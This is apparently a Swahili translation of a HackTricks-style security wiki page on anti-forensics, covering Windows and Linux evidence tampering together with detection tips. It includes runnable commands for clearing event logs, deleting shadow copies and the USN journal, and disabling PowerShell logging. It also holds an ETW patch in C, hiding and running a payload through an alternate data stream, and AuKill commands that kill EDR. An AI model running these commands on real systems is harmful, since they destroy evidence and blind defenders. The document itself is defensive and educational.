# Mbinu za Kuzuia Uchunguzi wa Kidijitali

{{#include ../../banners/hacktricks-training.md}}

## Mihuri ya Muda

Mshambuliaji anaweza kutaka **kubadilisha mihuri ya muda ya faili** ili asigunduliwe.\
Inawezekana kupata mihuri ya muda ndani ya MFT kwenye sifa `$STANDARD_INFORMATION` \_\_ na \_\_ `$FILE_NAME`.

Sifa zote mbili zina mihuri 4 ya muda: **Marekebisho**, **ufikiaji**, **uundaji**, na **marekebisho ya sajili ya MFT** (MACE au MACB).

**Windows Explorer** na zana nyingine huonyesha maelezo kutoka **`$STANDARD_INFORMATION`**.

### TimeStomp - Zana ya Kuzuia Uchunguzi wa Kidijitali

Zana hii **hubadilisha** maelezo ya mihuri ya muda ndani ya **`$STANDARD_INFORMATION`** **lakini** **haibadilishi** maelezo ndani ya **`$FILE_NAME`**. Kwa hiyo, inawezekana **kutambua** **shughuli** **zinazotia shaka**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya volume. Zana ya [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) huruhusu uchunguzi wa mabadiliko haya.

![TimeStomp - Zana ya Kuzuia Uchunguzi wa Kidijitali - Usnjrnl: USN Journal (Update Sequence Number Journal) ni kipengele cha NTFS (mfumo wa faili wa Windows NT) kinachofuatilia mabadiliko ya volume. ...](<../../images/image (801).png>)

Picha iliyotangulia inaonyesha **matokeo** ya **zana**, ambapo inaonekana kuwa **baadhi ya mabadiliko yalifanywa** kwenye faili.

### $LogFile

**Mabadiliko yote ya metadata kwenye mfumo wa faili huwekwa kwenye kumbukumbu** katika mchakato unaojulikana kama [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Metadata iliyowekwa kwenye kumbukumbu huhifadhiwa kwenye faili inayoitwa `**$LogFile**`, iliyo kwenye saraka kuu ya mfumo wa faili wa NTFS. Zana kama [LogFileParser](https://github.com/jschicht/LogFileParser) zinaweza kutumika kuchanganua faili hii na kutambua mabadiliko.

![Usnjrnl - $LogFile: Mabadiliko yote ya metadata kwenye mfumo wa faili huwekwa kwenye kumbukumbu katika mchakato unaojulikana kama write-ahead logging. Metadata iliyowekwa kwenye kumbukumbu huhifadhiwa kwenye faili inayoitwa $LogFile , iliyo kwenye saraka kuu...](<../../images/image (137).png>)

Tena, kwenye matokeo ya zana inawezekana kuona kwamba **baadhi ya mabadiliko yalifanywa**.

Kwa kutumia zana hiyo hiyo inawezekana kutambua **mihuri ya muda ilibadilishwa hadi wakati gani**:

![Usnjrnl - $LogFile: Kwa kutumia zana hiyo hiyo inawezekana kutambua mihuri ya muda ilibadilishwa hadi wakati gani](<../../images/image (1089).png>)

- CTIME: Muda wa kuundwa kwa faili
- ATIME: Muda wa kurekebishwa kwa faili
- MTIME: Muda wa marekebisho ya sajili ya MFT ya faili
- RTIME: Muda wa ufikiaji wa faili

### Ulinganisho wa `$STANDARD_INFORMATION` na `$FILE_NAME`

Njia nyingine ya kutambua faili zilizorekebishwa kwa kutiliwa shaka ni kulinganisha muda kwenye sifa zote mbili na kutafuta **kutolingana**.

### Nanosekunde

Mihuri ya muda ya **NTFS** ina **usahihi** wa **nanosekunde 100**. Kwa hiyo, kupata faili zenye mihuri ya muda kama 2010-10-10 10:10:**00.000:0000 kunatia shaka sana**.

### SetMace - Zana ya Kuzuia Uchunguzi wa Kidijitali

Zana hii inaweza kurekebisha sifa zote mbili za `$STARNDAR_INFORMATION` na `$FILE_NAME`. Hata hivyo, kuanzia Windows Vista, mfumo wa uendeshaji unaoendesha lazima utumike kurekebisha maelezo haya.

## Kuficha Data

NTFS hutumia cluster na ukubwa wa chini kabisa wa taarifa. Hiyo inamaanisha kuwa ikiwa faili inatumia cluster moja na nusu, **nusu iliyobaki haitatumika** hadi faili ifutwe. Kwa hiyo, inawezekana **kuficha data kwenye slack space** hii.

Kuna zana kama slacker zinazowezesha kuficha data kwenye nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa `$logfile` na `$usnjrnl` unaweza kuonyesha kwamba data fulani iliongezwa:

![SetMace - Zana ya Kuzuia Uchunguzi wa Kidijitali - Kuficha Data: Kuna zana kama slacker zinazowezesha kuficha data kwenye nafasi hii "iliyofichwa". Hata hivyo, uchanganuzi wa $logfile na $usnjrnl unaweza kuonyesha kwamba...](<../../images/image (1060).png>)

Kisha, inawezekana kupata slack space kwa kutumia zana kama FTK Imager. Kumbuka kwamba aina hii ya zana inaweza kuhifadhi maudhui yakiwa yamefichwa au hata yamesimbwa kwa njia fiche.

## UsbKill

Hii ni zana ambayo **huzima kompyuta ikitambua mabadiliko yoyote kwenye** milango ya USB.\
Njia moja ya kugundua hili ni kukagua michakato inayoendeshwa na **kuchunguza kila script ya python inayoendeshwa**.

## Usambazaji wa Linux wa Moja kwa Moja

Usambazaji huu **huendeshwa ndani ya** kumbukumbu ya RAM. Njia pekee ya kuugundua ni **ikiwa mfumo wa faili wa NTFS umeunganishwa kwa ruhusa za kuandika**. Ukiunganishwa kwa ruhusa za kusoma pekee, haitawezekana kugundua uvamizi huo.

## Ufutaji Salama

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Kujifuta kwa Windows kwa Kucheleweshwa

Picha ya Windows inayoendeshwa inaweza kufungwa wakati mchakato wake unaendelea. Mchakato unaweza kukabidhi jukumu la kufuta kwa `cmd.exe` ya child, kutumia `choice` kama kipima muda, kisha kutoka kabla shell haijafikia `del`. Kucheleweshwa kunaruhusu mchakato wa awali kuachilia handle ya picha yake; kuweka njia kamili ndani ya alama za kunukuu ni muhimu ikiwa ina nafasi.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Wakati mfuatano huu unatolewa moja kwa moja kama argument kwa `cmd.exe` badala ya kuandikwa kutoka kwa prompt nyingine ya `cmd` inayoingiliana, tumia `&` badala ya `^&` na `>nul` badala ya `^>nul`. Hii huondoa ingizo la directory; **si ufutaji salama** na haiondoi execution, task, filesystem-journal, au athari nyingine za uchunguzi wa kidijitali. Tafuta michakato mifupi ya `cmd.exe` iliyoanzishwa na michakato mingine, ambayo command line yake inachanganya `choice /T`, `Del`, na njia ya image ya mchakato mzazi.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Usanidi wa Windows

Inawezekana kuzima mbinu kadhaa za logging za Windows ili kufanya uchunguzi wa kidijitali kuwa mgumu zaidi.

### Zima Timestamps - UserAssist

Hii ni registry key inayohifadhi tarehe na saa ambazo kila executable iliendeshwa na mtumiaji.

Kuzima UserAssist kunahitaji hatua mbili:

1. Weka registry keys mbili, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` na `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, zote ziwe sifuri ili kuonyesha kwamba tunataka UserAssist izimwe.
2. Futa matawi ya registry yanayofanana na `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Zima Timestamps - Prefetch

Hii huhifadhi taarifa kuhusu programu zilizoendeshwa kwa lengo la kuboresha utendaji wa mfumo wa Windows. Hata hivyo, taarifa hii pia inaweza kusaidia katika uchunguzi wa kidijitali.

- Endesha `regedit`
- Chagua njia ya faili `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Bofya kulia `EnablePrefetcher` na `EnableSuperfetch`
- Chagua Modify kwa kila moja ili kubadilisha thamani kutoka 1 (au 3) hadi 0
- Anzisha upya

### Zima Timestamps - Last Access Time

Kila folda inapofunguliwa kutoka kwa NTFS volume kwenye seva ya Windows NT, mfumo husasisha **uga wa timestamp kwenye kila folda iliyoorodheshwa**, unaoitwa last access time. Kwenye NTFS volume inayotumika sana, hili linaweza kuathiri utendaji.

1. Fungua Registry Editor (Regedit.exe).
2. Nenda kwenye `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Tafuta `NtfsDisableLastAccessUpdate`. Ikiwa haipo, ongeza DWORD hii na uweke thamani yake kuwa 1 ili kuzima mchakato huo.
4. Funga Registry Editor na uwashe upya seva.

### Futa Historia ya USB

**Ingizo zote za USB Device** huhifadhiwa kwenye Windows Registry chini ya registry key ya **USBSTOR**, ambayo ina sub keys zinazoundwa kila unapochomeka USB Device kwenye PC au Laptop yako. Unaweza kupata key hii hapa H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Ukiifuta**, utafuta historia ya USB.\
Unaweza pia kutumia zana ya [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) ili kuhakikisha kwamba umezifuta (na kuzifuta).

Faili nyingine inayohifadhi taarifa kuhusu USB ni `setupapi.dev.log` iliyo ndani ya `C:\Windows\INF`. Hii pia inapaswa kufutwa.

### Zima Shadow Copies

**Orodhesha** shadow copies kwa `vssadmin list shadowstorage`\
**Yafute** kwa kuendesha `vssadmin delete shadow`

Unaweza pia kuyafuta kupitia GUI kwa kufuata hatua zilizopendekezwa kwenye [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Ili kuzima shadow copies [fuata hatua kutoka hapa](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Fungua programu ya Services kwa kuandika "services" kwenye kisanduku cha kutafuta maandishi baada ya kubofya kitufe cha Windows start.
2. Kwenye orodha, tafuta "Volume Shadow Copy", ichague, kisha ufungue Properties kwa kubofya kulia.
3. Chagua Disabled kwenye menyu kunjuzi ya "Startup type", kisha thibitisha mabadiliko kwa kubofya Apply na OK.

Pia inawezekana kubadilisha usanidi wa faili zitakazonakiliwa kwenye shadow copy kupitia registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Andika juu ya faili zilizofutwa

- Unaweza kutumia **zana ya Windows**: `cipher /w:C` Hii itaelekeza cipher kuondoa data yoyote kwenye nafasi ya diski isiyotumika inayopatikana ndani ya drive C.
- Unaweza pia kutumia zana kama [**Eraser**](https://eraser.heidi.ie)

### Futa Windows event logs

- Windows + R --> eventvwr.msc --> Panua "Windows Logs" --> Bofya kulia kila kategoria na uchague "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Zima Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Katika sehemu ya services, zima huduma ya "Windows Event Log"
- `WEvtUtil.exec clear-log` au `WEvtUtil.exe cl`

### Zima $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Logging ya Kina na Uchezeaji wa Trace (2023-2025)

### PowerShell ScriptBlock/Module Logging

Matoleo ya hivi karibuni ya Windows 10/11 na Windows Server huhifadhi **artefact nyingi za uchunguzi wa kidijitali za PowerShell** chini ya
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).  
Wavamizi wanaweza kuzizima au kuzifuta papo hapo:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Watetezi wanapaswa kufuatilia mabadiliko kwenye funguo hizo za registry na uondoaji wa matukio ya PowerShell kwa wingi.

### ETW (Event Tracing for Windows) Patch

Bidhaa za usalama wa endpoint hutegemea sana ETW. Mbinu maarufu ya kukwepa ugunduzi ya mwaka 2024 ni kufanya patch ya `ntdll!EtwEventWrite`/`EtwEventWriteFull` kwenye kumbukumbu, ili kila mwito wa ETW urudishe `STATUS_SUCCESS` bila kutoa tukio:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (k.m. `EtwTiSwallow`) hutumia primitive hiyo hiyo katika PowerShell au C++.  
Kwa kuwa patch hii ni **process-local**, EDR zinazoendeshwa ndani ya processes nyingine zinaweza zisisaidie kuiona.<sup>[[5]](#references)</sup>
Detection: linganisha `ntdll` iliyo kwenye memory na ile iliyo kwenye disk, au weka hook kabla ya user-mode.

### Uamsho wa Alternate Data Streams (ADS)

Kampeni za malware mwaka wa 2023 (k.m. loaders za **FIN12**) zimeonekana kuhifadhi binaries za hatua ya pili ndani ya ADS ili zisigunduliwe na scanners za kawaida:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Orodhesha streams kwa kutumia `dir /R`, `Get-Item -Stream *`, au Sysinternals `streams64.exe`.
Kunakili faili mwenyeji kwenye FAT/exFAT au kupitia SMB kutaondoa stream iliyofichwa na kunaweza kutumiwa na wachunguzi kurejesha payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver sasa hutumiwa mara kwa mara kwa **anti-forensics** katika mashambulizi ya ransomware.  
Zana ya open-source **AuKill** hupakia driver iliyotiwa saini lakini iliyo hatarini (`procexp152.sys`) ili kusimamisha au kusitisha EDR na vitambuzi vya forensics **kabla ya usimbaji fiche na uharibifu wa logi**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

The driver huondolewa baadaye, na kuacha mabaki machache.<sup>[[1]](#references)</sup>  
Mitigations: washa orodha ya Microsoft ya madereva hatarishi waliozuiwa (HVCI/SAC),
na toa tahadhari kuhusu uundaji wa kernel-service kutoka kwenye njia zinazoweza kuandikiwa na watumiaji.

---

## Linux Anti-Forensics: Self-Patching na Cloud C2 (2023–2025)

### Kujifanyia “self-patch” kwa huduma zilizoathiriwa ili kupunguza ugunduzi (Linux)
Washambuliaji wanazidi kujifanyia “self-patch” huduma mara tu baada ya kuzitumia vibaya, ili kuzuia mashambulizi ya kutumia udhaifu huo tena na kukandamiza ugunduzi unaotegemea udhaifu. Lengo ni kubadilisha vipengele vilivyo hatarini kwa binaries/JARs halali za hivi karibuni kutoka upstream, ili scanners ziripoti kuwa host imewekewa viraka huku persistence na C2 vikiendelea.<sup>[[3]](#references)</sup>

Mfano: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Baada ya exploitation, washambuliaji walipakua JARs halali kutoka Maven Central (repo1.maven.org), wakafuta JARs zilizo hatarini kwenye usakinishaji wa ActiveMQ, kisha wakawasha upya broker.
- Hii ilifunga RCE ya awali huku footholds nyingine zikiendelea (cron, mabadiliko ya usanidi wa SSH, C2 implants tofauti).

Mfano wa kiutendaji (wa kuonyesha)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Vidokezo vya uchunguzi wa kidijitali/uwindaji
- Kagua saraka za huduma ili kuona kama binary/JAR zimebadilishwa bila ratiba:
  - Debian/Ubuntu: `dpkg -V activemq` na ulinganishe hash/njia za faili na vioo vya repo.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Tafuta matoleo ya JAR yaliyo kwenye diski lakini hayamilikiwi na package manager, au symbolic links zilizosasishwa nje ya utaratibu.
- Ratiba ya matukio: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` ili kuoanisha ctime/mtime na kipindi cha uvamizi.
- Historia ya shell/telemetry ya michakato: ushahidi wa `curl`/`wget` kwenda `repo1.maven.org` au CDN nyingine za artifacts mara tu baada ya unyonyaji wa awali.
- Usimamizi wa mabadiliko: thibitisha ni nani aliyetumia “patch” na kwa nini, si kuthibitisha tu kwamba toleo lililowekewa patch lipo.

### C2 ya huduma za wingu yenye bearer tokens na anti-analysis stagers
Mbinu za mashambulizi zilizozingatiwa zilichanganya njia nyingi za muda mrefu za C2 na ufungashaji wa anti-analysis:<sup>[[3]](#references)</sup>
- ELF loaders zilizolindwa kwa nenosiri na kutengenezwa kwa PyInstaller ili kufanya sandboxing na static analysis kuwa ngumu (k.m., PYZ iliyosimbwa kwa njia fiche, uchimbaji wa muda chini ya `/_MEI*`).
  - Viashiria: matokeo ya `strings` kama `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Mabaki ya wakati wa utekelezaji: uchimbaji kwenda `/tmp/_MEI*` au njia maalum za `--runtime-tmpdir`.
- C2 inayotumia Dropbox kwa kutumia OAuth Bearer tokens zilizowekwa moja kwa moja kwenye msimbo
  - Viashiria vya mtandao: `api.dropboxapi.com` / `content.dropboxapi.com` zenye `Authorization: Bearer <token>`.
  - Tafuta kwenye proxy/NetFlow/Zeek/Suricata miunganisho ya HTTPS inayotoka kwenda kwenye vikoa vya Dropbox kutoka kwa workload za seva ambazo kwa kawaida hazisawazishi faili.
- C2 sambamba/ya akiba kupitia tunneling (k.m., Cloudflare Tunnel `cloudflared`), ili kudumisha udhibiti iwapo njia moja itazuiwa.
  - IOC za host: michakato/vitengo vya `cloudflared`, usanidi kwenye `~/.cloudflared/*.json`, miunganisho inayotoka ya 443 kwenda kwenye Cloudflare edges.

### Kudumisha ufikiaji kupitia persistence na “kurudisha nyuma hardening” (mifano ya Linux)
Washambuliaji mara nyingi huunganisha kujipachisha marekebisho na njia za kudumu za ufikiaji:<sup>[[3]](#references)</sup>
- Cron/Anacron: mabadiliko kwenye stub ya `0anacron` katika kila saraka ya `/etc/cron.*/` kwa ajili ya utekelezaji wa mara kwa mara.
  - Tafuta:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Kurejesha nyuma uimarishaji wa usanidi wa SSH: kuwezesha kuingia kama root na kubadilisha shell chaguomsingi za akaunti zenye ruhusa chache.
  - Tafuta sehemu zinazowezesha kuingia kama root:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Chunguza shell shirikishi zinazotiliwa shaka kwenye akaunti za mfumo (kwa mfano, `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Mabaki ya beacon ya nasibu yenye majina mafupi (herufi 8 za alfabeti), yaliyowekwa kwenye diski na pia kuwasiliana na cloud C2:
  - Tafuta:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Watetezi wanapaswa kuoanisha mabaki haya na matukio ya kuonekana kwa huduma nje ya mtandao wa ndani na ya kuweka viraka vya huduma ili kugundua hatua za kujirekebisha za anti-forensic zinazotumika kuficha unyonyaji wa awali.

## References

- [1] [Sophos X-Ops – AuKill: Dereva Hatarishi Aliyegeuzwa Silaha kwa Kuzima EDR (Machi 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Kuweka Viraka EtwEventWrite kwa Stealth: Utambuzi na Uwindaji (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Kuweka Viraka kwa Uendelevu: Jinsi Malware ya DripDropper Linux Inavyosonga Kwenye Cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Kuficha .NET Yako - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Kufichua Lahaja ya SectopRAT Iliyopachikwa Kwenye Programu Halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – amri ya choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – amri ya del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
